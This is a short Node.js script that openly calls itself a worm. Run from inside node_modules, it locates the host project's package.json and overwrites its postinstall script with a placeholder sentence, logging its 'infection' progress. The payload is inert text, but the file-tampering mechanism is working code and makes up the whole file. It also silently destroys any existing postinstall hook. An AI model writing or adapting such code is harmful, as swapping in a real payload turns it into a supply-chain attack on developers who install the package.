"use strict";

var path = require('path');
var fs = require('fs');

console.log('Beginning of worm infection');
try{
    
    var wormfilname = require.main.filename;
    var wormfileArr = wormfilname.split(path.sep);

    var nodeModulesIndex = wormfileArr.indexOf('node_modules');

    var projectPath = wormfileArr.slice(0, nodeModulesIndex).join(path.sep);

    console.log(wormfilname);
    console.log(projectPath);

    var packageJsonPath = path.join(projectPath, 'package.json');

    var packageJsonContent = JSON.parse(
        fs.readFileSync( packageJsonPath ).toString()
    );

    packageJsonContent.scripts = packageJsonContent.scripts || {};
    packageJsonContent.scripts.postinstall = "this sentence is the result of the worm infection";


    fs.writeFileSync( packageJsonPath, JSON.stringify(packageJsonContent, null, 3) )
    console.log('Worm infection complete, congratulations!');
}
catch(e){
    console.log('Woops, the worm failed to infect your machine', e);
}

